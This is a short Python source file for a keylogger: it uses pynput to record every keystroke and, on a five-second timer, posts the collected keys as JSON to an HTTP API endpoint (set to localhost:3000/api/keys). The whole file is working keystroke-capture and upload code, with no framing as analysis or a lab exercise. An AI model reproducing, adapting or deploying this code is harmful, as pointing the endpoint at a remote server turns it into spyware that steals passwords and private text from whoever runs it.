from pynput.keyboard import Key, Listener
import requests as req
import json
import threading
import time

keys = []

BASE_URL = "http://localhost:3000/api"
headers = {
    'Content-Type': 'application/json'
}

def sendKeys():
    global keys
    keyData = {
        "keyId": "1",
        "key": keys
    }

    json_data = json.dumps(keyData)

    res = req.post(BASE_URL+"/keys", data=json_data, headers=headers)
    print(res)
    threading.Timer(5, sendKeys).start()

sendKeys()

def onPress(key):
    print(key, end=" Pressed\n")
    global keys
    keys.append(str(key))
        
def onRelease(key):
    if key == Key.esc:
        return False

with Listener(on_press=onPress, on_release=onRelease) as listener:
    listener.join()